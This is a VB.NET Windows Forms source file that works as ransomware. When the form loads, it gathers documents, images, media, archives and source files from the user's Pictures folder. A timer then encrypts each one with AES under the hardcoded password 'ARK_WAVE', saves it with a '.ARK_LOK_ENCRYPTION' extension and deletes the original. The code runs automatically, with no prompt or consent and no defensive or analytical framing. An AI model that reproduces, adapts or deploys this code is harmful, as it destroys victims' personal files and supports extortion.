Imports System.IO
Imports System.Security.Cryptography

Public Class Form3

    Private PICZ As String = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)

    Private Sub Form3_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try
            For Each fDir As String In My.Computer.FileSystem.GetDirectories(PICZ)
                If fDir.EndsWith("Bin") Then
                Else
                    If fDir.EndsWith("indows") Then
                    Else
                        If fDir.EndsWith("tings") Then
                        Else
                            If fDir.EndsWith("System Volume Information") Then
                            Else
                                If fDir.EndsWith("cache") Then
                                Else
                                    If fDir.EndsWith("very") Then
                                    Else
                                        If fDir.EndsWith("rogram Files (x86)") Then
                                        Else
                                            If fDir.EndsWith("rogram Files") Then
                                            Else
                                                If fDir.EndsWith("boot") Then
                                                Else
                                                    If fDir.EndsWith("efi") Then
                                                    Else
                                                        If fDir.EndsWith(".old") Then
                                                        Else
                                                            ListBox1.Items.Add(fDir)
                                                            ListBox9.Items.Add(fDir)
                                                        End If

                                                    End If
                                                End If
                                            End If
                                        End If

                                    End If
                                End If
                            End If
                        End If
                    End If
                End If

            Next
        Catch ex As Exception

        End Try

        Try

            For Each fDir As String In My.Computer.FileSystem.GetFiles(PICZ)
                If fDir.EndsWith(".ARK_LOK_ENCRYPTION") Then

                Else
                    If fDir.EndsWith(".doc") Then
                        ListBox8.Items.Add(fDir)
                    Else
                        If fDir.EndsWith(".docx") Then
                            ListBox8.Items.Add(fDir)
                        Else
                            If fDir.EndsWith(".xls") Then
                                ListBox8.Items.Add(fDir)
                            Else
                                If fDir.EndsWith(".xlsx") Then
                                    ListBox8.Items.Add(fDir)
                                Else
                                    If fDir.EndsWith(".ppt") Then
                                        ListBox8.Items.Add(fDir)
                                    Else
                                        If fDir.EndsWith(".pptx") Then
                                            ListBox8.Items.Add(fDir)
                                        Else
                                            If fDir.EndsWith(".jpg") Then
                                                ListBox8.Items.Add(fDir)
                                            Else
                                                If fDir.EndsWith(".jpeg") Then
                                                    ListBox8.Items.Add(fDir)
                                                Else
                                                    If fDir.EndsWith(".png") Then
                                                        ListBox8.Items.Add(fDir)
                                                    Else
                                                        If fDir.EndsWith(".psd") Then
                                                            ListBox8.Items.Add(fDir)
                                                        Else
                                                            If fDir.EndsWith(".txt") Then
                                                                ListBox8.Items.Add(fDir)
                                                            Else
                                                                If fDir.EndsWith(".zip") Then
                                                                    ListBox8.Items.Add(fDir)
                                                                Else
                                                                    If fDir.EndsWith(".rar") Then
                                                                        ListBox8.Items.Add(fDir)
                                                                    Else
                                                                        If fDir.EndsWith(".html") Then
                                                                            ListBox8.Items.Add(fDir)
                                                                        Else
                                                                            If fDir.EndsWith(".php") Then
                                                                                ListBox8.Items.Add(fDir)
                                                                            Else
                                                                                If fDir.EndsWith(".asp") Then
                                                                                    ListBox8.Items.Add(fDir)
                                                                                Else
                                                                                    If fDir.EndsWith(".aspx") Then
                                                                                        ListBox8.Items.Add(fDir)
                                                                                    Else
                                                                                        If fDir.EndsWith(".mp4") Then
                                                                                            ListBox8.Items.Add(fDir)
                                                                                        Else
                                                                                            If fDir.EndsWith(".avi") Then
                                                                                                ListBox8.Items.Add(fDir)
                                                                                            Else
                                                                                                If fDir.EndsWith(".3gp") Then
                                                                                                    ListBox8.Items.Add(fDir)
                                                                                                Else
                                                                                                    If fDir.EndsWith(".wmv") Then
                                                                                                        ListBox8.Items.Add(fDir)
                                                                                                    Else
                                                                                                        If fDir.EndsWith(".MOV") Then
                                                                                                            ListBox8.Items.Add(fDir)
                                                                                                        Else
                                                                                                            If fDir.EndsWith(".mp3") Then
                                                                                                                ListBox8.Items.Add(fDir)
                                                                                                            Else
                                                                                                                If fDir.EndsWith(".wav") Then
                                                                                                                    ListBox8.Items.Add(fDir)
                                                                                                                Else
                                                                                                                    If fDir.EndsWith(".flac") Then
                                                                                                                        ListBox8.Items.Add(fDir)
                                                                                                                    Else
                                                                                                                        If fDir.EndsWith(".wma") Then
                                                                                                                            ListBox8.Items.Add(fDir)
                                                                                                                        Else
                                                                                                                            If fDir.EndsWith(".mov") Then
                                                                                                                                ListBox8.Items.Add(fDir)
                                                                                                                            Else
                                                                                                                                If fDir.EndsWith(".raw") Then
                                                                                                                                    ListBox8.Items.Add(fDir)
                                                                                                                                Else
                                                                                                                                    If fDir.EndsWith(".doc") Then
                                                                                                                                        ListBox8.Items.Add(fDir)
                                                                                                                                    Else
                                                                                                                                        If fDir.EndsWith(".apk") Then
                                                                                                                                            ListBox8.Items.Add(fDir)
                                                                                                                                        Else
                                                                                                                                            If fDir.EndsWith(".encrypt") Then
                                                                                                                                                ListBox8.Items.Add(fDir)
                                                                                                                                            Else
                                                                                                                                                If fDir.EndsWith("crypted") Then
                                                                                                                                                    ListBox8.Items.Add(fDir)
                                                                                                                                                Else
                                                                                                                                                    If fDir.EndsWith(".ahok") Then
                                                                                                                                                        ListBox8.Items.Add(fDir)
                                                                                                                                                    Else
                                                                                                                                                        If fDir.EndsWith(".cs") Then
                                                                                                                                                            ListBox8.Items.Add(fDir)
                                                                                                                                                        End If
                                                                                                                                                        If fDir.EndsWith(".vb") Then
                                                                                                                                                            ListBox8.Items.Add(fDir)
                                                                                                                                                        Else
                                                                                                                                                            If fDir.EndsWith(".ppt") Then
                                                                                                                                                                ListBox8.Items.Add(fDir)
                                                                                                                                                            Else
                                                                                                                                                                If fDir.EndsWith(".pptx") Then
                                                                                                                                                                    ListBox8.Items.Add(fDir)
                                                                                                                                                                Else
                                                                                                                                                                    If fDir.EndsWith(".docx") Then
                                                                                                                                                                        ListBox8.Items.Add(fDir)
                                                                                                                                                                    Else
                                                                                                                                                                        If fDir.EndsWith(".xlsx") Then
                                                                                                                                                                            ListBox8.Items.Add(fDir)
                                                                                                                                                                        Else
                                                                                                                                                                        End If
                                                                                                                                                                    End If
                                                                                                                                                                End If
                                                                                                                                                            End If
                                                                                                                                                        End If
                                                                                                                                                    End If
                                                                                                                                                End If
                                                                                                                                            End If
                                                                                                                                        End If
                                                                                                                                    End If
                                                                                                                                End If
                                                                                                                            End If
                                                                                                                        End If
                                                                                                                    End If
                                                                                                                End If
                                                                                                            End If
                                                                                                        End If
                                                                                                    End If
                                                                                                End If
                                                                                            End If
                                                                                        End If
                                                                                    End If
                                                                                End If
                                                                            End If
                                                                        End If
                                                                    End If
                                                                End If
                                                            End If
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        End If
                                    End If
                                End If
                            End If
                        End If
                    End If
                End If
            Next

        Catch ex As Exception

        End Try
        Timer1.Start()
    End Sub

    Dim strFileToEncrypt As String
    Dim strFileToDecrypt As String
    Dim strOutputEncrypt As String
    Dim strOutputDecrypt As String
    Dim fsInput As FileStream
    Dim fsOutput As FileStream
    Public Function CreateKey(ByVal strPassword As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim chrData() As Char = strPassword.ToCharArray
        'Use intLength to get strPassword size.
        Dim intLength As Integer = chrData.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim bytDataToHash(intLength) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        'Declare bytKey(31).  It will hold 256 bits.
        Dim bytKey(31) As Byte

        'Use For Next to put a specific size (256 bits) of 
        'bytResult into bytKey. The 0 To 31 will put the first 256 bits
        'of 512 bits into bytKey.
        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next

        Return bytKey 'Return the key.
    End Function
    Public Function CreateIV(ByVal strPassword As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim chrData() As Char = strPassword.ToCharArray
        'Use intLength to get strPassword size.
        Dim intLength As Integer = chrData.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim bytDataToHash(intLength) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        'Declare bytIV(15).  It will hold 128 bits.
        Dim bytIV(15) As Byte

        'Use For Next to put a specific size (128 bits) of 
        'bytResult into bytIV. The 0 To 30 for bytKey used the first 256 bits.
        'of the hashed password. The 32 To 47 will put the next 128 bits into bytIV.
        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next

        Return bytIV 'return the IV
    End Function
    Public Enum CryptoAction
        'Define the enumeration for CryptoAction.
        ActionEncrypt = 1
        ActionDecrypt = 2
    End Enum

    Public Sub EncryptOrDecryptFile(ByVal strInputFile As String,
                                     ByVal strOutputFile As String,
                                     ByVal bytKey() As Byte,
                                     ByVal bytIV() As Byte,
                                     ByVal Direction As CryptoAction)
        Try 'In case of errors.

            'Setup file streams to handle input and output.
            fsInput = New FileStream(strInputFile, FileMode.Open,
                                               FileAccess.Read)
            fsOutput = New FileStream(strOutputFile, FileMode.OpenOrCreate,
                                                FileAccess.Write)
            fsOutput.SetLength(0) 'make sure fsOutput is empty

            'Declare variables for encrypt/decrypt process.
            Dim bytBuffer(4096) As Byte 'holds a block of bytes for processing
            Dim lngBytesProcessed As Long = 0 'running count of bytes processed
            Dim lngFileLength As Long = fsInput.Length 'the input file's length
            Dim intBytesInCurrentBlock As Integer 'current bytes being processed
            Dim csCryptoStream As CryptoStream
            'Declare your CryptoServiceProvider.
            Dim cspRijndael As New RijndaelManaged
            'Setup Progress Bar
            ProgressBar10.Value = 0
            ProgressBar10.Maximum = 100

            'Determine if ecryption or decryption and setup CryptoStream.
            Select Case Direction
                Case CryptoAction.ActionEncrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                    cspRijndael.CreateEncryptor(bytKey, bytIV),
                    CryptoStreamMode.Write)

                Case CryptoAction.ActionDecrypt
                    csCryptoStream = New CryptoStream(fsOutput,
                    cspRijndael.CreateDecryptor(bytKey, bytIV),
                    CryptoStreamMode.Write)
            End Select

            'Use While to loop until all of the file is processed.
            While lngBytesProcessed < lngFileLength
                'Read file with the input filestream.
                intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
                'Write output file with the cryptostream.
                csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
                'Update lngBytesProcessed
                lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)
                'Update Progress Bar
                ProgressBar10.Value = CInt((lngBytesProcessed / lngFileLength) * 100)
            End While

            'Close FileStreams and CryptoStream.
            csCryptoStream.Close()
            fsInput.Close()
            fsOutput.Close()

            'If encrypting then delete the original unencrypted file.
            If Direction = CryptoAction.ActionEncrypt Then
                Dim fileOriginal As New FileInfo(strFileToEncrypt)
                fileOriginal.Delete()
            End If

            'If decrypting then delete the encrypted file.
            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileEncrypted As New FileInfo(strFileToDecrypt)
                fileEncrypted.Delete()
            End If

            'Update the user when the file is done.
            Dim Wrap As String = Chr(13) + Chr(10)
            If Direction = CryptoAction.ActionEncrypt Then
                MsgBox("Encryption Complete" + Wrap + Wrap +
                        "Total bytes processed = " +
                        lngBytesProcessed.ToString,
                        MsgBoxStyle.Information, "Done")

                'Update the progress bar and textboxes.


            Else
                'Update the user when the file is done.
                MsgBox("Decryption Complete" + Wrap + Wrap +
                       "Total bytes processed = " +
                        lngBytesProcessed.ToString,
                        MsgBoxStyle.Information, "Done")

                'Update the progress bar and textboxes.

            End If


            'Catch file not found error.
        Catch When Err.Number = 53 'if file not found
            MsgBox("Please check to make sure the path and filename" +
                    "are correct and if the file exists.",
                     MsgBoxStyle.Exclamation, "Invalid Path or Filename")

            'Catch all other errors. And delete partial files.
        Catch
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileDelete As New FileInfo(PICZ)
                fileDelete.Delete()



            Else
                Dim fileDelete As New FileInfo(PICZ)
                fileDelete.Delete()




            End If

        End Try
    End Sub



    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        ProgressBar9.Maximum = ListBox8.Items.Count
        If ProgressBar9.Value = ListBox8.Items.Count Then
            Timer1.Stop()

        Else

            ListBox8.SelectedIndex = ProgressBar9.Value

            ListBox8.SelectionMode = SelectionMode.One
            PICZ = CStr(ListBox8.SelectedItem)
            Try
                Dim bytIV As Byte()
                'Send the password to the CreateIV function.
                bytIV = CreateIV("ARK_WAVE")
                'Send the password to the CreateKey function.
                Dim bytKey As Byte() = CreateKey("ARK_WAVE")
                'Start the encryption.
                EncryptOrDecryptFile(PICZ, PICZ + ".ARK_LOK_ENCRYPTION",
                                     bytKey, bytIV, CryptoAction.ActionEncrypt)
            Catch ex As Exception

            End Try
            ProgressBar9.Increment(1)
        End If
    End Sub

End Class